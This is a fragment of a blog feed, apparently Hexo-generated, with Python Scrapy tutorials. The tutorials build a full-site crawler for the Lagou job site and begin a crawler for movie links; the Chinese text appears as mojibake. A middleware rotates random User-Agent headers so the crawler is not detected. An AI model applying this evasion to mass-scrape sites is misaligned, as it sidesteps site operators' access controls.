AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36==========================================================================================2019-01-27 14:18:03 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36==========================================================================================2019-01-27 14:18:05 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows; U; Windows NT 6.0; nb-NO) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5==========================================================================================2019-01-27 14:18:06 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36==========================================================================================</code></pre><p>è‡ªå®šä¹‰User_Agent</p><pre><code>2019-01-27 15:30:19 [scrapy.core.engine] INFO: Spider opened2019-01-27 15:30:19 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)2019-01-27 15:30:19 [scrapy.extensions.telnet] DEBUG: Telnet console listening on 127.0.0.1:60232019-01-27 15:30:20 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: None)==========================================================================================Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0==========================================================================================2019-01-27 15:30:21 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows NT 6.2; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0==========================================================================================2019-01-27 15:30:23 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0==========================================================================================2019-01-27 15:30:23 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A==========================================================================================2019-01-27 15:30:25 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25==========================================================================================2019-01-27 15:30:26 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931==========================================================================================</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpideræ‹‰å‹¾ç½‘å…¨ç«™æŠ“å–</title>
      <link href="/2019/01/25/scrapycrawlspider-la-gou-wang-quan-zhan-zhua-qu/"/>
      <url>/2019/01/25/scrapycrawlspider-la-gou-wang-quan-zhan-zhua-qu/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®å±•ç¤º"><a href="#æ•°æ®å±•ç¤º" class="headerlink" title="æ•°æ®å±•ç¤º"></a>æ•°æ®å±•ç¤º</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/dJPWyOHbTHAkjjbqjRafuNpAoylQIyQKswTjeegFcH8!/b/dLYAAAAAAAAA&amp;bo=yAUWAwAAAAADB*o!&amp;rf=viewer_4" alt="æ•°æ®å±•ç¤º"></p><h1 id="ç½‘ç«™åˆ†æ"><a href="#ç½‘ç«™åˆ†æ" class="headerlink" title="ç½‘ç«™åˆ†æ"></a>ç½‘ç«™åˆ†æ</h1><h2 id="åˆ†æé¦–é¡µ"><a href="#åˆ†æé¦–é¡µ" class="headerlink" title="åˆ†æé¦–é¡µ"></a>åˆ†æé¦–é¡µ</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/S4KN..H..ModSavlRJ4jqX*wMb0sII20jcpAJEVV77A!/b/dDYBAAAAAAAA&amp;bo=YQd.AwAAAAADNwk!&amp;rf=viewer_4" alt="é¦–é¡µ"></p><p>é¦–é¡µä¸­æœ‰èŒä½çš„åˆ†ç±»,æŠ“å–æ‰€æœ‰çš„èŒä½,ç‚¹å‡»è¿›å»çœ‹èŒä½åˆ†ç±»çš„url</p><h2 id="åˆ†æèŒä½åˆ†ç±»"><a href="#åˆ†æèŒä½åˆ†ç±»" class="headerlink" title="åˆ†æèŒä½åˆ†ç±»"></a>åˆ†æèŒä½åˆ†ç±»</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/RCszUk30b7oFdvndszLE0BIBj5IEI.tjiQoV*rR10qM!/b/dLYAAAAAAAAA&amp;bo=DAbQAwAAAAADJ9s!&amp;rf=viewer_4" alt="èŒä½åˆ†ç±»"></p><p>åœ¨èŒä½åˆ†ç±»çš„é¡µé¢ä¸‹æœ‰å…·ä½“çš„è¯¦æƒ…é¡µé¢</p><h2 id="åˆ†æå…¬å¸é¡µé¢"><a href="#åˆ†æå…¬å¸é¡µé¢" class="headerlink" title="åˆ†æå…¬å¸é¡µé¢"></a>åˆ†æå…¬å¸é¡µé¢</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/6FlT7RVC0lql6hlza9cbxdvcvFm65rFvvp*xxnPytRY!/b/dL8AAAAAAAAA&amp;bo=dwWJAwAAAAADF8o!&amp;rf=viewer_4" alt="å…¬å¸"></p><h2 id="åˆ†æèŒä½çš„è¯¦æƒ…é¡µé¢"><a href="#åˆ†æèŒä½çš„è¯¦æƒ…é¡µé¢" class="headerlink" title="åˆ†æèŒä½çš„è¯¦æƒ…é¡µé¢"></a>åˆ†æèŒä½çš„è¯¦æƒ…é¡µé¢</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/4PC4iH*mIsqMhVqTyg6IONJGBrdXlvWRVRf7oIKPNeg!/b/dDUBAAAAAAAA&amp;bo=ogaRAwAAAAADJzQ!&amp;rf=viewer_4" alt="è¯¦æƒ…é¡µé¢"></p><p>è¿›å…¥è¯¦æƒ…é¡µé¢è·å–æˆ‘ä»¬æƒ³è¦çš„æ•°æ®</p><p>æˆ‘ä»¬çš„çˆ¬è™«è®¿é—®è·¯å¾„,å…ˆè¿›å…¥é¦–é¡µ,ç„¶ååŒ¹é…èŒä½åˆ†ç±»çš„url,å…¬å¸çš„url,ä»¥åŠè¯¦æƒ…é¡µçš„url,èŒä½åˆ†ç±»å’Œå…¬å¸çš„urlåŒ¹é…åˆ°ä¹‹åæ¥ç€å¯¹é¡µé¢è¿›è¡Œè·Ÿè¸ªåŒ¹é…,å› ä¸ºæˆ‘ä»¬åšçš„å…¨ç«™çˆ¬è™«.</p><h1 id="ç¼–å†™ä»£ç "><a href="#ç¼–å†™ä»£ç " class="headerlink" title="ç¼–å†™ä»£ç "></a>ç¼–å†™ä»£ç </h1><h2 id="å®šä¹‰Item"><a href="#å®šä¹‰Item" class="headerlink" title="å®šä¹‰Item"></a>å®šä¹‰Item</h2><p>æ ¹æ®æƒ³è·å–çš„æ•°æ®å®šä¹‰Item</p><pre><code>url# èŒä½urlurl_object_idèŒä½urlå¯¹åº”çš„idtitleèŒä½åå­—salaryè–ªèµ„æ°´å¹³cityå·¥ä½œåŸå¸‚yearså·¥ä½œå¹´é™degreeä»»èŒç¨‹åº¦job_typeå·¥ä½œç±»å‹publish_timeå‘å¸ƒæ—¶é—´tagsæ ‡ç­¾job_advantageèŒä½ä¼˜åŠ¿job_descèŒä½æè¿°job_addrèŒä½åœ°å€company_urlå…¬å¸å®˜æ–¹ç½‘ç«™åœ°å€company_nameå…¬å¸åå­—crawl_timeæŠ“å–æ—¶é—´crawl_update_timeæŠ“å–æ›´æ–°æ—¶é—´</code></pre><h2 id="å®šä¹‰æ ¹æ®ç½‘ç«™çš„Urlå®šä¹‰CrawlSpiderçš„æŠ“å–Rule"><a href="#å®šä¹‰æ ¹æ®ç½‘ç«™çš„Urlå®šä¹‰CrawlSpiderçš„æŠ“å–Rule" class="headerlink" title="å®šä¹‰æ ¹æ®ç½‘ç«™çš„Urlå®šä¹‰CrawlSpiderçš„æŠ“å–Rule"></a>å®šä¹‰æ ¹æ®ç½‘ç«™çš„Urlå®šä¹‰CrawlSpiderçš„æŠ“å–Rule</h2><pre><code>rules = (        Rule(LinkExtractor(allow=r&#39;zhaopin/.*&#39;, ), follow=True),  # èŒä½åˆ†ç±»        Rule(LinkExtractor(allow=r&#39;gongsi/j\d+.html&#39;), follow=True),  # åŒ¹é…å…¬å¸å†…çš„æ‹›è˜èŒä½        Rule(LinkExtractor(allow=r&#39;jobs/\d+.html&#39;), callback=&#39;parse_job&#39;, follow=True),  # èŒä½è¯¦æƒ…é¡µé¢åŒ¹é…    )</code></pre><h2 id="è®¾ç½®éšæœºè¯·æ±‚å¤´"><a href="#è®¾ç½®éšæœºè¯·æ±‚å¤´" class="headerlink" title="è®¾ç½®éšæœºè¯·æ±‚å¤´"></a>è®¾ç½®éšæœºè¯·æ±‚å¤´</h2><pre><code>class UserAgentDownloadMiddleware(object):    # è¯·æ±‚å¤´åˆ—è¡¨    USER_AGENT = [        &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;,        &quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&quot;,        &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931&quot;,        &quot;Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393&quot;,        &quot;Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0&quot;,        &quot;Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,        &quot;Mozilla/5.0 (Windows NT 6.2; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,        &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0&quot;,        &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A&quot;,        &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2&quot;,    ]    def process_request(self, request, spider):        user_agent = random.choice(self.USER_AGENT)  # éšæœºé€‰æ‹©è¯·æ±‚å¤´        request.headers[&quot;User-Agent&quot;] = user_agent  # ç»™requestæ·»åŠ éšæœºè¯·æ±‚å¤´</code></pre><h2 id="è¯¦æƒ…é¡µçš„æŠ“å–è§„åˆ™"><a href="#è¯¦æƒ…é¡µçš„æŠ“å–è§„åˆ™" class="headerlink" title="è¯¦æƒ…é¡µçš„æŠ“å–è§„åˆ™"></a>è¯¦æƒ…é¡µçš„æŠ“å–è§„åˆ™</h2><p>è¿™é‡Œä½¿ç”¨çš„Itemloaderså¡«å……çš„Item,ä½¿ç”¨add_xpathå’Œadd_valueå°†å€¼æ”¶é›†åˆ°itemloadesä¸­.</p><pre><code>    def parse_job(self, response):        # è§£ææ‹‰å‹¾ç½‘çš„èŒä½        item_loader = LagouItemLoader(item=LagoujobItem(), response=response)  # åˆ›å»ºItemLoaderçš„å®ä¾‹        item_loader.add_xpath(&quot;title&quot;, &quot;//div[@class=&#39;job-name&#39;]//span/text()&quot;)  # èŒä½åå­—        item_loader.add_value(&quot;url&quot;, response.url)  # èŒä½url        item_loader.add_value(&quot;url_object_id&quot;, get_md5(response.url))  # èŒä½urlå¯¹åº”çš„id        item_loader.add_xpath(&quot;salary&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[@class=&#39;salary&#39;]/text()&quot;)        item_loader.add_xpath(&quot;city&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[2]/text()&quot;)  # å·¥ä½œåŸå¸‚        item_loader.add_xpath(&quot;years&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[3]/text()&quot;)  # å·¥ä½œå¹´é™        item_loader.add_xpath(&quot;degree&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[4]/text()&quot;)  # ä»»èŒç¨‹åº¦        item_loader.add_xpath(&quot;job_type&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[5]/text()&quot;)  # å·¥ä½œç±»å‹        item_loader.add_xpath(&quot;tags&quot;, &quot;//ul[contains(@class,&#39;position-label&#39;)]/li/text()&quot;)  # æ ‡ç­¾,æ³¨æ„æœ‰äº›æ‹›è˜ä¿¡æ¯æ˜¯å•ä¸ªçš„æ ‡ç­¾,è€Œæœ‰äº›ç¡®å®å¾ˆå¤šçš„        item_loader.add_xpath(&quot;publish_time&quot;, &quot;//p[@class=&#39;publish_time&#39;]/text()&quot;)  # å‘å¸ƒæ—¶é—´,éœ€è¦è¿›è¡Œå¤„ç†        item_loader.add_xpath(&quot;job_advantage&quot;, &quot;//dd[@class=&#39;job-advantage&#39;]/p/text()&quot;)  # èŒä½ä¼˜åŠ¿        job_desc_list = response.xpath(            &quot;//dd[@class=&#39;job_bt&#39;]/div[@class=&#39;job-detail&#39;]/p/text()&quot;).getall()  # èŒä½æè¿°  æ³¨æ„è¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨,éœ€è¦è¿›è¡Œå¤„ç†        job_desc = &quot;,&quot;.join(job_desc_list)        item_loader.add_value(&quot;job_desc&quot;, job_desc)  # èŒä½æè¿°  æ³¨æ„è¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨,éœ€è¦è¿›è¡Œå¤„ç†        job_addr = response.xpath(&quot;//div[@class=&#39;work_addr&#39;]//text()&quot;).getall()  # èŒä½åœ°å€        job_addr = &quot;,&quot;.join(job_addr)  # å°†åˆ—è¡¨æ‹¼æ¥æˆå­—ç¬¦ä¸²        job_addr = re.sub(&quot;-|\n|,| |æŸ¥çœ‹åœ°å›¾&quot;, &quot;&quot;, job_addr)  # ä½¿ç”¨æ­£åˆ™åšæ•°æ®å¤„ç†        item_loader.add_value(&quot;job_addr&quot;, job_addr)  # èŒä½åœ°å€        item_loader.add_xpath(&quot;company_name&quot;, &quot;//*[@id=&#39;job_company&#39;]/dt/a/img/@alt&quot;)  # å…¬å¸åå­—        item_loader.add_xpath(&quot;company_url&quot;, &quot;//*[@id=&#39;job_company&#39;]/dt/a/@href&quot;)  # å…¬å¸å®˜æ–¹ç½‘ç«™åœ°å€        item_loader.add_value(&quot;crawl_time&quot;, datetime.datetime.now())  # æŠ“å–æ—¶é—´        job_item = item_loader.load_item()  # åŠ è½½Item        return job_item</code></pre><h2 id="ä½¿ç”¨ItemLoadersè¿›è¡Œæ•°æ®å¤„ç†"><a href="#ä½¿ç”¨ItemLoadersè¿›è¡Œæ•°æ®å¤„ç†" class="headerlink" title="ä½¿ç”¨ItemLoadersè¿›è¡Œæ•°æ®å¤„ç†"></a>ä½¿ç”¨ItemLoadersè¿›è¡Œæ•°æ®å¤„ç†</h2><pre><code>import scrapyfrom scrapy.loader import ItemLoaderfrom scrapy.loader.processors import TakeFirst, MapComposeimport refrom w3lib.html import remove_tags  # è¿™ä¸ªæ¨¡å—ä¸“é—¨ç”¨æ¥å»é™¤Htmlä¸­çš„æ ‡ç­¾çš„class LagouItemLoader(ItemLoader):    default_output_processor = TakeFirst()def process_input_city_and_degree_years(value):    # å¯¹è¾“å…¥çš„åŸå¸‚è¿›è¡Œå¤„ç†    value = re.sub(&quot;/&quot;, &quot;&quot;, value).strip()    return valuedef process_input_salary(value):    # å¯¹è¾“å…¥çš„è–ªæ°´è¿›è¡Œå¤„ç†    result = re.sub(&quot;k&quot;, &quot;000&quot;, value).replace(&quot;-&quot;, &#39; &#39;).strip()    return resultdef process_input_publish_time(value):    # å¯¹è¾“å…¥çš„å‘å¸ƒæ—¶é—´è¿›è¡Œå¤„ç†    result = re.sub(&quot;\xa0&quot;, &quot;&quot;, value).strip()    return resultdef process_input_desc(value):    # èŒä½è¯¦æƒ…çš„å¤„ç†    if value == &quot;&quot;:        return &quot;æ— &quot;    else:        return valueclass LagoujobItem(scrapy.Item):    url = scrapy.Field()  # èŒä½url    url_object_id = scrapy.Field()  # èŒä½urlå¯¹åº”çš„id    title = scrapy.Field()  # èŒä½åå­—    salary = scrapy.Field(        input_processor=MapCompose(process_input_salary)    )  # è–ªèµ„æ°´å¹³    city = scrapy.Field(        input_processor=MapCompose(process_input_city_and_degree_years),    )  # å·¥ä½œåŸå¸‚    years = scrapy.Field(        input_processor=MapCompose(process_input_city_and_degree_years),    )  # å·¥ä½œå¹´é™    degree = scrapy.Field(        input_processor=MapCompose(process_input_city_and_degree_years),    )  # ä»»èŒç¨‹åº¦    job_type = scrapy.Field()  # å·¥ä½œç±»å‹    publish_time = scrapy.Field(        input_processor=MapCompose(process_input_publish_time)    )  # å‘å¸ƒæ—¶é—´    tags = scrapy.Field(        input_processor=MapCompose(process_input_desc),    )  # æ ‡ç­¾    job_advantage = scrapy.Field()  # èŒä½ä¼˜åŠ¿    job_desc = scrapy.Field(        input_processor=MapCompose(process_input_desc),    )  # èŒä½æè¿°    job_addr = scrapy.Field()  # èŒä½åœ°å€    company_url = scrapy.Field()  # å…¬å¸å®˜æ–¹ç½‘ç«™åœ°å€    company_name = scrapy.Field()  # å…¬å¸åå­—    crawl_time = scrapy.Field()  # æŠ“å–æ—¶é—´    crawl_update_time = scrapy.Field()  # æŠ“å–æ›´æ–°æ—¶é—´</code></pre><h2 id="å¯¹urlè¿æ¥è¿›è¡ŒMD5"><a href="#å¯¹urlè¿æ¥è¿›è¡ŒMD5" class="headerlink" title="å¯¹urlè¿æ¥è¿›è¡ŒMD5"></a>å¯¹urlè¿æ¥è¿›è¡ŒMD5</h2><pre><code>import hashlibdef get_md5(url):    &quot;&quot;&quot;    å°†urlé“¾æ¥è½¬æ¢æˆmd5    :param url:    :return:    &quot;&quot;&quot;    if isinstance(url, str):        url = url.encode(&quot;utf-8&quot;)       # è®¾ç½®urlçš„ç¼–ç ä¸ºutf-8    m = hashlib.md5()    m.update(url)    return m.hexdigest()</code></pre><h2 id="ä½¿ç”¨Twistedè¿›è¡Œå¼‚æ­¥IOæ’å…¥"><a href="#ä½¿ç”¨Twistedè¿›è¡Œå¼‚æ­¥IOæ’å…¥" class="headerlink" title="ä½¿ç”¨Twistedè¿›è¡Œå¼‚æ­¥IOæ’å…¥"></a>ä½¿ç”¨Twistedè¿›è¡Œå¼‚æ­¥IOæ’å…¥</h2><p>å½“æˆ‘ä»¬å¤„ç†å¤§é‡çš„è¯·æ±‚çš„æ—¶å€™,å¼‚æ­¥æ’å…¥è¦æ¯”åŒæ­¥æ’å…¥é€Ÿåº¦å¿«å¾ˆå¤š</p><pre><code>class MysqlTwistedPipeline(object):    &#39;&#39;&#39;    ä½¿ç”¨Twistedæ¡†æ¶å®Œæˆå¼‚æ­¥Mysqlæ’å…¥    &#39;&#39;&#39;    def __init__(self, dbpool):        self.dbpool = dbpool    @classmethod    def from_settings(cls, settings):        &quot;&quot;&quot;        è¯»å–Scrapyçš„Settingæ–‡ä»¶,Scrapyè‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•        &quot;&quot;&quot;        # è¯¥å­—å…¸ä¸­çš„å‚æ•°åç§°å¿…é¡»å’ŒMySQLdb.connections.Connectionç±»ä¸­çš„å‚æ•°åç§°è¦ä¸€è‡´        dbparms = dict(            host=settings[&quot;MYSQL_HOST&quot;],            db=settings[&quot;MYSQL_DBNAME&quot;],            user=settings[&#39;MYSQL_USER&#39;],            password=settings[&#39;MYSQL_PASSWORD&#39;],            charset=&#39;utf8&#39;,            cursorclass=MySQLdb.cursors.DictCursor,            use_unicode=True,        )        dbpool = adbapi.ConnectionPool(&quot;MySQLdb&quot;, **dbparms)        return cls(dbpool)    def process_item(self, item, spider):        # ä½¿ç”¨Twistedå°†Mysqlæ’å…¥å˜æˆå¼‚æ­¥æ‰§è¡Œ        query = self.dbpool.runInteraction(self.do_insert, item)        query.addErrback(self.handle_error, item, spider)  # å¤„ç†å¼‚å¸¸    def handle_error(self, failure, item, spider):        &quot;&quot;&quot;        è¯¥å‡½æ•°ç”¨æ¥å¤„ç†å¼‚æ­¥æ’å…¥çš„å¼‚å¸¸        &quot;&quot;&quot;        print(failure)    def do_insert(self, cursor, item):        # æ‰§è¡Œå…·ä½“çš„æ’å…¥        insert_sql = &quot;&quot;&quot;            insert into lagoujob(url,url_object_id,title,salary,city,years,degree,job_type,publish_time,tags,job_advantage,job_desc,job_addr,company_url,company_name,crawl_time)            values(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)                       &quot;&quot;&quot;        cursor.execute(insert_sql,                       (item[&#39;url&#39;], item[&#39;url_object_id&#39;], item[&#39;title&#39;], item[&#39;salary&#39;], item[&#39;city&#39;],                        item[&#39;years&#39;], item[&#39;degree&#39;], item[&#39;job_type&#39;], item[&#39;publish_time&#39;], item[&#39;tags&#39;],                        item[&#39;job_advantage&#39;],item[&#39;job_desc&#39;],item[&#39;job_addr&#39;],item[&#39;company_url&#39;],item[&#39;company_name&#39;],item[&#39;crawl_time&#39;]))</code></pre><h2 id="æºç åˆ†äº«"><a href="#æºç åˆ†äº«" class="headerlink" title="æºç åˆ†äº«"></a>æºç åˆ†äº«</h2><p><strong>æ¬¢è¿Star </strong><a href="https://github.com/liu726301387/LaGouJobSpider" target="_blank" rel="noopener">https://github.com/liu726301387/LaGouJobSpider</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpideræ¡ˆä¾‹80Sç”µå½±é“¾æ¥çˆ¬è™«</title>
      <link href="/2019/01/13/scrapycrawlspider-an-li-80s-dian-ying-lian-jie-pa-chong/"/>
      <url>/2019/01/13/scrapycrawlspider-an-li-80s-dian-ying-lian-jie-pa-chong/</url>
      
        <content type="html"><![CDATA[<h1 id="é¡¹ç›®å‡†å¤‡"><a href="#é¡¹ç›®å‡†å¤‡" class="headerlink" title="é¡¹ç›®å‡†å¤‡"></a>é¡¹ç›®å‡†å¤‡</h1><h2 id="æ–°å»ºScrapyé¡¹ç›®"><a href="#æ–°å»ºScrapyé¡¹ç›®" class="headerlink" title="æ–°å»ºScrapyé¡¹ç›®"></a>æ–°å»ºScrapyé¡¹ç›®</h2><pre><code>scrapy startproject Spider_80s</code></pre><h1 id="æ–°å»ºCrawlSpiderçˆ¬è™«"><a href="#æ–°å»ºCrawlSpiderçˆ¬è™«" class="headerlink" title="æ–°å»ºCrawlSpiderçˆ¬è™«"></a>æ–°å»ºCrawlSpiderçˆ¬è™«</h1><p>åˆ‡æ¢åˆ°é¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œ</p><pre><code>scrapy genspider -t crawl MovieSpider 80s.tw</code></pre><h1 id="åˆ†æç›®æ ‡ç½‘ç«™"><a href="#åˆ†æç›®æ ‡ç½‘ç«™" class="headerlink" title="åˆ†æç›®æ ‡ç½‘ç«™"></a>åˆ†æç›®æ ‡ç½‘ç«™</h1><h2 id="åˆ—è¡¨é¡µåˆ†æ"><a href="#åˆ—è¡¨é¡µåˆ†æ" class="headerlink" title="åˆ—è¡¨é¡µåˆ†æ"></a>åˆ—è¡¨é¡µåˆ†æ</h2><p>æŠ“å–ç›®æ ‡ç½‘ç«™æ‰€æœ‰æœ€æ–°ç”µå½±.</p><p>é¦–é¡µ</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/dsuvtnePPXDPTN*WQxHXyRsh8ZfUOxj6ldCXDUjIofU!/b/dFMBAAAAAAAA&amp;bo=5QV7AwAAAAADB7o!&amp;rf=viewer_4" alt="é¦–é¡µ"></p><p>æœ€æ–°ç”µå½±é¡µé¢</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/w.cOqpts9wTi83sTCdU9MEbOvpW6zZRYopKLLXHup0Y!/b/dL4AAAAAAAAA&amp;bo=DgaAAwAAAAADN5k!&amp;rf=viewer_4" alt="æœ€æ–°ç”µå½±"></p><p>åˆ†é¡µURL</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/SpfqXyUus7Cep.49d1GuYPOcy8o5uDqyK6m7CJhG6mk!/b/dEgBAAAAAAAA&amp;bo=mwRQAwAAAAADR64!&amp;rf=viewer_4" alt="åˆ†é¡µ"></p><p>ä»åˆ†é¡µURLé‡Œé¢å¯ä»¥åˆ†æå‡ºæ¥è¯¥ç½‘ç«™åˆ†é¡µURLçš„è§„å¾‹,åé¢urlå°¾éƒ¨çš„æ•°å­—æ˜¯æ¯ä¸€é¡µå·ç .</p><p><a href="https://www.80s.tw/movie/list/-----p/**2*" target="_blank" rel="noopener">https://www.80s.tw/movie/list/-----p/**2*</a>*</p><h2 id="è¯¦æƒ…é¡µurlæå–"><a href="#è¯¦æƒ…é¡µurlæå–" class="headerlink" title="è¯¦æƒ…é¡µurlæå–"></a>è¯¦æƒ…é¡µurlæå–</h2><p>åœ¨æœ€æ–°åˆ—è¡¨é¡µé¢ä¸­å¯ä»¥æ‰¾åˆ°ç”µå½±è¯¦æƒ…é¡µé¢çš„URL</p><p>åœ¨åˆ—è¡¨é¡µä¸­æ¯ä¸ªå½±ç‰‡çš„è¯¦æƒ…é¡µurléƒ½æ˜¯åœ¨aæ ‡ç­¾ä¸‹çš„hrefå±æ€§ä¸­</p><pre><code>href=&quot;/movie/23902&quot;</code></pre><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/6VgZ7gZFmlz2FKKE4nuqEfwfFFBLmU0EBqkSw3MyZkw!/b/dL8AAAAAAAAA&amp;bo=mgWsAgAAAAADNyM!&amp;rf=viewer_4" alt="è¯¦æƒ…é¡µurl"></p><h2 id="è¯¦æƒ…é¡µåˆ†æ"><a href="#è¯¦æƒ…é¡µåˆ†æ" class="headerlink" title="è¯¦æƒ…é¡µåˆ†æ"></a>è¯¦æƒ…é¡µåˆ†æ</h2><p>æ‹¿åˆšåˆšçš„è¯¦æƒ…é¡µurlä½œä¸ºä¾‹å­,åˆ†æä¸‹è¯¦æƒ…é¡µä¸­æˆ‘ä»¬æƒ³è¦æå–çš„æ•°æ®</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/z5MolR3DQ0NnKkGAUnX2s52Waq9g5fkHUynuraIlhnA!/b/dEkBAAAAAAAA&amp;bo=WgR9AwAAAAADJyI!&amp;rf=viewer_4" alt="è¯¦æƒ…é¡µ"></p><h1 id="Scrapyä»£ç ç¼–å†™"><a href="#Scrapyä»£ç ç¼–å†™" class="headerlink" title="Scrapyä»£ç ç¼–å†™"></a>Scrapyä»£ç ç¼–å†™</h1><p>MovieSpiderä¸­å¡«å†™å¼€å§‹URL,è¿™é‡Œæˆ‘ä»¬æ˜¯ä»ç¬¬ä¸€é¡µå¼€å§‹çˆ¬å–çš„æ‰€ä»¥å°±å†™ç”µå½±åˆ—è¡¨ä¸­ç¬¬ä¸€é¡µçš„url</p><pre><code>https://www.80s.tw/movie/list/-----p/1</code></pre><p>å®šä¹‰ç”µå½±åˆ—è¡¨é¡µurlçš„æå–è§„åˆ™å’Œç”µå½±è¯¦æƒ…é¡µurlçš„æå–è§„åˆ™</p><pre><code>Rule(LinkExtractor(allow=r&#39;https://www.80s.tw/movie/list/-----p/\d&#39;), follow=True),     # ç”µå½±åˆ—è¡¨é¡µurlçš„æå–Rule(LinkExtractor(allow=&quot;.*/movie/\d&quot;), callback=&quot;parse_item&quot;, follow=False),      # ç”µå½±è¯¦æƒ…é¡µé¢urlçš„æå–</code></pre><p>Ruleè§„åˆ™é‡Œé¢æˆ‘ä»¬æå–äº†è¯¦æƒ…é¡µé¢ä¹‹å,å¯¹è¯¦æƒ…é¡µè¿›è¡Œçˆ¬å–æå–é‡Œé¢æˆ‘ä»¬æƒ³è¦çš„æ•°æ®.æ‰€ä»¥è¿™é‡Œçš„callbackå‚æ•°æˆ‘ä»¬æŒ‡å®šä¸º<strong>parse_item</strong>æ–¹æ³•,è¯¥æ–¹æ³•ç”¨æ¥æå–è¯¦æƒ…é¡µä¸­çš„æ•°æ®.</p><pre><code>def parse_item(self, response):    